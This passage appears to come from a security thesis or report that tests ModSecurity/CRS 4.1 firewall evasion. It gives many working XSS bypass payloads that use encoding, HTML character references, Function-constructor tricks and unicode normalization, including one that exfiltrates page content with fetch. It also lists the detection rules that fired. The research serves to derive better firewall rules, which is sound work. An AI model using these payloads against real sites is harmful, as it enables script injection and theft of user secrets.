\subsection{Multi Iteration Evaluation}
\label{sec:multiiteration}
This chapter states the evaluation results of multiple iterations of application of an evasion technique to the specified payloads. If a considerable bypass was found, the result will be detailed and used to derive additional firewall rules as shown under Section~\ref{sec:rulesproposal}.


\subsubsection{Percent encoding + Unicode in JSON}
The ModSecurity firewall blocks requests containing unicode escaped characters in JSON. (see Section~\ref{sec:unicodeinjsontest})
In order to evade this rule, a payload containing a unicode escaped character was percent-encoded previous to submission.
The ModSecurity firewall detected the unicode escape regardless and rejects the request:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=unicode escape in json with additional percent encoding, label={lst:jsonunicodeurlenctest}]
<payload>urllib.parse.quote('{ "body": "alert\\u0024{1}" }')</payload>
<payload>%7B%20%22body%22%3A%20%22alert%5Cu0024%7B1%7D%22%20%7D</payload>
<message>"Possible Unicode character bypass detected"</message>
<file>"/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"</file>
<fileDetails>[line "1263"] [id "920540"]<fileDetails>
<MatchedData>"x5cu0024"</MatchedData>
\end{lstlisting}


\subsubsection{Double Percent encoding}
\label{sec:doublepercenc}
The payload from Listing~\ref{lst:urlencodedexampleblocked} was blocked by the ModSecurity firewall.
On usage of double Percent encoding , the rules with ids \verb|932130, 941390| no longer triggered and the payload bypasses the WAF:

\begin{lstlisting}[style=basicStyle, caption=url encoded example pass, label={lst:doublepercentencoding}, escapeinside=\^\^, language=Python]
import urllib
urllib.parse.quote(urllib.parse.quote('alert(`${new Date()}`)'))
returns
alert%2528%2560%2524%257Bnew%2520Date%2528%2529%257D%2560%2529
\end{lstlisting}

However, this payload would not be valid unless the target also performs multiple step url decoding. Multiple step url decoding is forbidden according to RFC3986 "Uniform Resource Identifier (URI): Generic Syntax" - Section 2.4:
\begin{quote}
	Implementations must not
	percent-encode or decode the same string more than once, as decoding
	an already decoded string might lead to misinterpreting a percent
	data octet as the beginning of a percent-encoding, or vice versa in
	the case of percent-encoding an already percent-encoded string.
\end{quote}

\subsubsection{Double HTML character reference}
\label{sec:doublehtmlcharref}
As stated under Section~\ref{sec:htmlcharrefsingleeva}, three blacklisting rules caused the ModSecurity firewall using CRS4.1 to block the payload:

\begin{lstlisting}[style=basicStyle, language=Python]
<a href=javascript:alert('a')>ClickMeFor$</a>
\end{lstlisting}

After obscuring the payload with a single iteration of HTML character reference substitution, the modified payload:

\begin{lstlisting}[style=basicStyle, language=Python, escapeinside=\^\^]
<a href=jav^\&\#x61^;script:alert('a')>ClickMeFor$</a>
\end{lstlisting}

successfully bypassed two of the three rules that caused the firewall to block the request.

On escaping the left parenthesis: \verb|(| in the javascript function \verb|alert()|, which was part of the matched data that caused rule with id \verb|941390| to match (see Listing~\ref{lst:storedxssinjblocked}), the payload becomes:

\begin{lstlisting}[style=basicStyle, language=Python, caption=HTML character reference bypass, label={lst:htmlcharacterreferencebypass}, escapeinside=\^\^]
<a href=jav^\&\#x61;script:alert\&\#x28;^'a')>ClickMeFor$</a>
\end{lstlisting}

and successfully bypasses the ModSecurity firewall using CRS4.1.


\subsubsection{HTML encoding + JavaScript normal character escape}
\label{sec:htmlencjsesc}
The following payload could be used by an attacker intending to employ stored XSS to exfiltrate secrets \cite{swigger/storedxss}.
It was blocked by the ModSecurity firewall based on 4 rule triggers:
\begin{lstlisting}[style=ruleStyle, language=XML, caption=stored xss payload blocked, label={lst:storedxssblocked}]
<payload><a href=javascript:var secret = document.getElementsByName('name')[0].innerHTML;var data = {body:secret,method:'POST'};fetch('http://localhost:3001/api/ping?secret=something',data)>ClickMeFor$</a></payload>

<message>"Possible Server Side Request Forgery (SSRF) Attack: Cloud provider metadata URL in Parameter"</message>
<file>"/rules/REQUEST-934-APPLICATION-ATTACK-GENERIC.conf"</file>
<fileDetails>[line "88"] [id "934110"]<fileDetails>
<MatchedData>"http://localhost"</MatchedData>

<message>"NoScript XSS InjectionChecker: Attribute Injection"</message>
<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "225"] [id "941170"]<fileDetails>
<MatchedData>"javascript:[...]"</MatchedData>

<message>"Node-Validator Deny List Keywords"</message>
<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "252"] [id "941180"]<fileDetails>
<MatchedData>".innerhtml"</MatchedData>

<message>"IE XSS Filters - Attack Detected"</message>
<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "323"] [id "941210"]<fileDetails>
<MatchedData>"javascript:v"</MatchedData>
\end{lstlisting}

As the payload is meant to be injected into an html document, HTML escaping can be used to escape certain characters.
On escaping of the character \verb|a| in \verb|j&#97vascript|, the payload evaded the rules with ids \verb|941170| and \verb|941210|.
On escaping the \verb|.| in \\ \verb|getElementsByName('name')[0]&#46innerHTML|, the payload evaded rule \verb|941180|.
Finally one of the \verb|/| in the url-string given to the JavaScript function \verb|fetch| is escaped by prepending it with a \verb|\|.
Escaping any normal character with a \verb|\| is allowed in JavaScript (Section~\ref{sec:jsescape}) and successfully made the payload evade the last remaining rule: \verb|934110|.
The bypassing payload:

\begin{lstlisting}[style=basicStyle, caption=stored xss bypass payload]
<a href=j&#97vascript:var secret = document.getElementsByName('name')[0]&#46innerHTML;var data = {body:secret,method:'POST'};fetch('http:\//localhost:3001/api/ping?secret=something',data)>ClickMeFor$</a>
\end{lstlisting}

\subsubsection{Function constructor + String concatenation + From charcode}
\label{sec:charcodemultiiter}
Following up on the idea to split the character sequence \verb|String.fromCharCode| into multiple segments, which was stated during the single iteration evaluation under Section~\ref{sec:charcodesingleiter}, the payload:

\begin{lstlisting}[style=basicStyle, language=Python]
String.fromCharCode(0x61,108,0x65,114,116,0x28,96,120,115,115,0x60,0x29)
\end{lstlisting}

was split into two parts using the function constructor and string concatenation:

\begin{lstlisting}[style=basicStyle, language=Python]
[].map.constructor('String.' + 'fromCharCode(0x61,108,0x65,114,116,0x28,96,120,115,115,0x60,0x29)')();
\end{lstlisting}

This payload successfully bypasses the ModSecurity firewall configured to use the CRS4.1. In order to make this payload execute by itself, another use of the function constructor and string concatenation was applied:

\begin{lstlisting}[style=basicStyle, language=Python]
[].map.constructor('[].map.constructor(' + 'String.' + 'fromCharCode(0x61,108,0x65,114,116,0x28,96,120,115,115,0x60,0x29)' + ')();')();
\end{lstlisting}

On evaluating this payload against the tested firewall, the newly applied obscurity triggered a different filtering rule:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=stored xss payload blocked, label={lst:storedxssblocked}]
<payload>
[].map.constructor('[].map.constructor(' + 'String.' + 'fromCharCode(0x61,108,0x65,114,116,0x28,96,120,115,115,0x60,0x29)' + ')();')();
</payload>

<message>"PHP Injection Attack: Variable Function Call Found"</message>
<file>"/rules/REQUEST-933-APPLICATION-ATTACK-PHP.conf"</file>
<fileDetails>[line "488"] [id "933210"]<fileDetails>
<MatchedData>"('[].map.constructor(''String.''fromCharCode(0x61,108,0x65,114,116,0x28,96,120,115,115,0x60,0x29)'')();')();"</MatchedData>
\end{lstlisting}

The regex used in this rule:

\begin{lstlisting}[style=basicStyle]
(?:\((?:.+\)(?:[\"'][\-0-9A-Z_a-z]+[\"'])?\(.+|[^\)]*string[^\)]*\)[\s\x0b\"'\-\.0-9A-\[\]_a-\{\}]+\([^\)]*)|(?:\[[0-9]+\]|\{[0-9]+\}|\$[^\(\),\.\/;\x5c]+|[\"'][\-0-9A-Z\x5c_a-z]+[\"'])\(.+)\);
\end{lstlisting}

requires a semicolon to finish the statement. In JavaScript, cases exist, where this semicolon is not neccessary. One such case would be the existance of a semicolon finished statement in the code just before where the payload is injected and a newline followed by another function call or variable assignment in the code after where the payload is injected. A case where the semicolon would be neccessary to achieve code execution is the following:

\begin{lstlisting}[style=basicStyle, language=Python]
<statements before>

[].map.constructor('[].map.constructor(' + 'String.' + 'fromCharCode(0x61,108,0x65,114,116,0x28,96,120,115,115,0x60,0x29)' + ')();')()

[].constructor.constructor('alert("exception")')()

<statements after>
\end{lstlisting}

JavaScript is able to automatically insert some semicolons to create valid syntax from statements where the semicolons have been omitted. JavaScript's automatic semicolon insertion rules are stated under \cite{js/autosemi}.


\subsubsection{Eval + JavaScript character escape}
\label{sec:jsescapemultiiter}
As shown in Section~\ref{sec:jsescapesingleiter}, JavaScript's unicode code point escape sequence can be used to escape identifiers.
Characters in String literals can also be replaced by escape sequences in JavaScript. Considering the bypass in Listing~\ref{lst:strconcbypass} mentioned under Section~\ref{sec:stringconcsingleiter}, the bypassing payload containing a string literal:

\begin{lstlisting}[style=basicStyle, language=Python]
'alert' + '(`concatenation`)'
\end{lstlisting}

with the intention of bypassing the regex filter matching on \verb|alert(| can be improved. The payload needs to be evaluated twice on the target in order to achieve the desired effect. The first evaluation concatenates the string composing the desired JavaScript statements, the second evaluation achieved the desired effect through evaluating JavaScript statements contained in the just concatenated string. 

The first way to substitute the evaluation, that concatenates the payload string, is by a payload obscured using JavaScrip escape sequences instead of string concatenation:

\begin{lstlisting}[style=basicStyle, language=Python, caption='alert\textbackslash u\{0028\}`escaped`) bypass]
'alert\u{0028}`escaped`)'
\end{lstlisting}

Through substituting the opening parenthesis \verb|(|, the firewall does not match on the character sequence \verb|alert(| and the string concatenation can be omitted.

The second way to substitute the evaluation, that concatenates the payload string, is by a payload using \verb|eval()| that has been obscured through JavaScript escape sequences that enforces this evaluation:

\begin{lstlisting}[style=basicStyle, language=Python, caption='ev\textbackslash u\{0061\}l('alert' + '(`escaped`)') bypass]
ev\u{0061}l('alert' + '(`escaped`)')
\end{lstlisting}

Through substituting a part of the \verb|eval()| function, matches on \verb|eval(|, that are seen in Listing~\ref{lst:evalalertXSSblocked} under Section~\ref{sec:evalsingleiter}, are avoided. A similar result to the bypass listed in Listing~\ref{lst:funconbypass} under Section~\ref{sec:functionconstructorsingleeva} has been achieved.



\subsubsection{Function constructor + String concatenation}
\label{sec:funconstrconbypass}
In this test, the payload logic should include multiple statements and reveal a secret by accessing a property.
The basic implementation was blocked by the ModSecurity firewall:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=function constructor blocked, label={lst:funconblocked}]
<payload>new Function('var s = "secret";prompt("something", s)')()</payload>

<message>"Node.js Injection Attack 1/2"</message>
<file>"/rules/REQUEST-934-APPLICATION-ATTACK-GENERIC.conf"</file>
<fileDetails>[line "52"] [id "934100"]<fileDetails>
<MatchedData>"new Function("</MatchedData>

<message>"Javascript method detected"</message>
<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "714"] [id "941390"]<fileDetails>
<MatchedData>"prompt("</MatchedData>
\end{lstlisting}

To evade rule with id \verb|934100|, calling the \verb|Function()| constructor was substituted with \verb|[]['constructor']['constructor']()|. Using string concatenation to replace the character sequence \verb|'prompt'| with \verb|'promp + t'| successfully made the payload evade rule \verb|941390| and bypass the WAF. The bypassing payload:

\begin{lstlisting}[style=basicStyle, caption=function constructor bypass payload using square bracket notation]
[]['constructor']['constructor']('var s = "secret";promp' + 't("something", s)')()
\end{lstlisting}

Similarly, using the dot-syntax instead of bracket-access, the following payload bypasses the firewall:

\begin{lstlisting}[style=basicStyle, caption=function constructor bypass payload using dot notation]
[].constructor.constructor('var s = "secret";promp' + 't("something", s)')()
\end{lstlisting}

\subsubsection{Avoiding ()}
\label{sec:avoidingbypassA}
In the context of testing firewall evasion techniques, the author faced the question if it was possible to create payloads without  \verb|()|. Those payloads still need to be valid and bypass the waf.
Considering the bypassing payload from \ref{sec:funconstrconbypass}, opening and closing \verb|()| can be substituted with Tagged Template Literals. This caused another firewall rule to trigger:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=avoiding () blocked, label={lst:avoiding () blocked}]
<payload>[]['constructor']['constructor']`a${'var s = "secret";promp' + 't`something${s}`'}```</payload>

<message>"Remote Command Execution: Unix Shell Expression Found"</message>
<file>"/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"</file>
<fileDetails>[line "291"] [id "932130"]<fileDetails>
<MatchedData>"${s}`}"</MatchedData>
\end{lstlisting}

Evading rule \verb|932130| was possible by using a form of unicode escaping in JavaScript that was introduced with ES6 and differs from the unicode escaping in JSON. The character sequence \verb|${s}| was replaced with \verb|\u{0024}{s}|. This made the payload bypass the ModSecurity firewall. The bypassing payload:

\begin{lstlisting}[style=basicStyle, caption=avoiding () bypass payload using square bracket notation]
[]['constructor']['constructor']`a${'var s = "secret";promp' + 't`something\u{0024}{s}`'}```
\end{lstlisting}

Similarly, using the dot-syntax instead of bracket-access, the following payload bypasses the firewall:

\begin{lstlisting}[style=basicStyle, caption=avoiding () bypass payload using dot notation]
[].constructor.constructor`a${'var s = "secret";promp' + 't`something\u{0024}{s}`'}```
\end{lstlisting}

It is conspicuous that the payload could bypass the firewall with only the later \verb|$| of the two placeholders: \verb|${expression}| escaped.
This seems to be a bug in the WAF or the ruleset.
It is also what enables the above payload to be valid.
A substitution of the earlier \verb|$| with an escaped variant is not possible.
JavaScript does not recognize the placeholder in the Template Literal without the explicit character \verb|$|.
Substitution of the second placeholder is possible because it happens inside a string containing the Tagged Template Literal.

If the webserver is using unicode normalization (NFKC) to normalize incoming requests, the character \verb|$| can also be replaced with another character in unicode that gets normalized to it to create a valid bypassing payload. It was tested with the small dollar sign U+FE69. In this case it was neccessary to use Percent encoding in addition to avoid that the WAF flags the Unicode escape sequences as \quotes{Possible Unicode character bypass detected}:

\begin{lstlisting}[style=basicStyle, caption=avoiding () bypass payload using unicode normalization]
urllib.parse.quote("[]['constructor']['constructor']`a\uFE69{'var s = \"secret\";promp' + 't`something\uFE69{s}`'}```")
returns
%5B%5D%5B%27constructor%27%5D%5B%27constructor%27%5D%60a%EF%B9%A9%7B%27var%20s%20%3D%20%22secret%22%3Bpromp%27%20%2B%20%27t%60something%EF%B9%A9%7Bs%7D%60%27%7D%60%60%60
\end{lstlisting}
% console.log(encodeURIComponent('[][`constructor`][`constructor`]`a\uFE69{`al`+[open+[]][0][11]+`rt`+[open+[]][0][13]+[`"`][0]+`Oneconsult`+[`"`][0]+[open+[]][0][14]}```'))

\subsubsection{Avoiding \{\}}
\label{sec:avoidingbypassB}
A payload thats not using any \verb|{}| but still allows for Tagged Template Literals or other usages of \verb|{}| can be created using string replace strategies. Considering the payload from the previous Section~\ref{sec:avoidingbypassA}, the similar payload in Listing~\ref{lst:stringreplaceblocked} was being blocked by the modsecurity firewall:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=blocked for \$\{\} payload, label={lst:stringreplaceblocked}]
<payload>[][`constructor`][`constructor`]('pro' + 'mpt`seeValueInInput${2+2}`')();</payload>
<message>"Remote Command Execution: Unix Shell Expression Found"</message>
<file>"/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"</file>
<fileDetails>[line "291"] [id "932130"]<fileDetails>
<MatchedData>"${2 2}"</MatchedData>
\end{lstlisting}

On using a string replace strategy like mentioned in \ref{sec:stringreplace}, a payload in the form of

\begin{lstlisting}[style=basicStyle, caption=avoiding {} bypass payload using square bracket notation, label={lst:stringreplacepass}]
[][`constructor`][`constructor`]('pro' + 'mpt`seeValueInInput$' + [open + []][0][16] + '2+2' + [open + []][0][36] + ':`')();
\end{lstlisting}

successfully evaded the firewall.

Similarly, using the dot-syntax instead of bracket-access, the following payload bypasses the firewall:

\begin{lstlisting}[style=basicStyle, caption=avoiding {} bypass payload using dot notation, label={lst:stringreplacepass}]
[].constructor.constructor('pro' + 'mpt`seeValueInInput$' + [open + []][0][16] + '2+2' + [open + []][0][36] + ':`')();
\end{lstlisting}




\subsubsection{Forcing unicode normalization}
{\color{red} TODO: what happens if a string followed by .normalize('NFKC') is sent as payload?}
